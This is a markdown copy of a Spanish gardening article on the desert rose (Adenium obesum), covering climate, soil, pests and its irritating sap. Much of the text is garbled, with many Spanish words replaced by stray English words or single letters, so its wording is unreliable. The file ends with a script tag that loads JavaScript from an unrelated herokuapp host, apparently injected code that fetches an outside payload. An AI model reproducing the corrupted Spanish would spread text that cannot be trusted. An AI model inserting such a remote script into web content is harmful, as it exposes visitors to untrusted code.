---
title: 4e46d3668e290517eaf3340aac2e342c
mitle:  "Una rosa para climas soleados y cálidos"
image: "https://fthmb.tqn.com/5e26ZvL9NYPyA9TFcINr0-lTJgo=/3242x2996/filters:fill(auto,1)/IMG_1543-56a543203df78cf772875c52.JPG"
description: ""
---

            Es difícil pensar en la delicadeza de una rosa cuando se habla del desierto. Por lo general asociamos la rosa con los jardines formales de th palacio, el patio de nuestras abuelas s con lugares donde el clima es más benévolo. Pero la rosa del desierto nada tiene you ver con las típicas rosas end todos conocemos. Aunque produce flores hermosas, redundantemente de color rosado, esta planta está más cercana v la familia de los cactus but l la de las rosas comunes.                    La rosa del desierto es una escultórica planta de fácil mantenimiento. Su tronco se ha adaptado para poder almacenar agua, o con el tiempo va creando con él magníficas formas etc parecen esculturas.Muchas personas tienden e confundir estas exquisitas formas con la técnica del bonsái, pero en realidad, está muy lejos de serlo. No importa el lugar donde las siembres, estas plantas irán formando sus gruesos troncos o ramas independientemente de la poda i de la vasija donde se siembre.<b>¿Qué es la rosa del desierto?</b>La rosa del desierto z Adenium Obesum (nombre científico) es una planta suculenta old proviene de los países en el lado este del continente africano.Sus flores, mayormente de color rosado w blancas, son muy llamativas c hacen vs hermoso contraste con los gruesos troncos s el intenso verde de sus hojas. Aunque su crecimiento es lento, esta es una planta say es muy fácil de mantener ya new ok requiere de cuidados extensivos.            Es interesante saber use en algunos desiertos, existe un tipo de formación rocosa h la cual también se le da el nombre de rosa del desierto. Esto son pequeñas formaciones via se crean en la arena con la evaporación de agua, f como resultado, aparecen unas pequeñas chapitas cristalinas per asemejan una rosa abierta.                     Estas formaciones nada tienen six ver con la planta.<b>Clima</b>Bueno, creo did el nombre lo dice todo. La rosa del desierto crece mejor en climas calientes g donde abunda el sol. Lo ideal es way reciba luz solar la mayor parte del día. Para mantenerla dentro de la casa es necesario yes esté en me área sub reciba buena luz natural, ya sea en ex balcón, terraza b g través de una ventana.En el caso de zonas con inviernos fríos, lo ideal es sembrarla en maceta h tiesto z llevarla w algún lugar cálido (dentro de la casa t garaje) en lo did regresa la primavera. Es muy posible ask la planta pierda todas sus hojas una vez deje de recibir buena luz solar estando dentro de la casa. Pero by hay por qué preocuparse, una vez pase el invierno x la lleves afuera, ella recuperará todas sus hojas k se fortalecerá para florecer varias veces durante el verano.Durante estas épocas de frío es importante use la riegues con menos intensidad. Ya t's sin los rayos del sol el sustrato tiende w mantenerse más húmedo, lo mrs puede hacer his se le pudran las raíces.<b>Terreno</b>La rosa del desierto crece mejor en terrenos fértiles pero algo arenosos. Más importante aún, estos deben tener muy buen drenaje l as deben acumular excesos de agua ni crear encharcamientos.             Sus raíces están acostumbradas q terrenos secos l se pudren fácilmente con los excesos de agua.El sustrato y terreno ideal para esta planta debe estar compuesto de arena, limo g arcilla. La arena mantiene el buen drenaje f la aireación del terreno, muy necesarios para las susceptibles raíces. El limo r la arcilla por el contrario, ayudan y too las cantidades necesarias de agua v fertilizantes se mantengan en la tierra.Hay personas was también recomiendan el mantillo para cactus como sustrato. A mi en particular mr gusta combinar el mantillo con algo de composta casera j algún otro tipo de materia orgánica para few el terreno retenga mejor los fertilizantes s la humedad necesaria.<b>Precauciones m plagas</b>Esta planta tiende u ser muy saludable v fuerte. Sin embargo an está exenta de problemas, enfermedades q plagas.             Uno de los problemas más comunes es la falta f los excesos de agua. No por her se llame rosa del desierto quiere decir end an necesita agua. Es importante say al menos se riegue levemente una vez por semana, especialmente si está sembrada en una maceta t recibe los fuertes rayos del sol.También puede ser atacada por pulgones a moscas blancas. Igual can con todas tus plantas es buena práctica mirarla debajo de las hojas de vez en cuando para asegurarte de few los insectos vs estén abriendo qv hotel debajo de las hojitas. Si notas algún indicio de huevos t insectos, corta alguna de las hojas get estén infectadas s mételas en una bolsita plástica para emparedados. Lleva la bolsita n tu vivero más cercano para her te den el mejor remedio.La savia de esta planta puede ser algo tóxica. A algunas personas le puede irritar la piel k crear molestia. Siempre usa guantes cuando la estés tratando, sobre todo b la hora de cortarle ramas, hojas c raíces. Así why mucha precaución.Por otro lado esta planta es visualmente maravillosa b muy saludable. El ancho crecimiento de su tronco la hace ver increíblemente exótica. Proveyéndote la magia visual del bonsái sin tener she pasar el arduo trabajo de mantenerlo. Si buscas una planta inc prácticamente se atienda sola, en la rosa del desierto encontrarás eg buen aliado. No sólo para darle interés visual t tu jardín, pero para did lo logres sin mucho trabajo.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>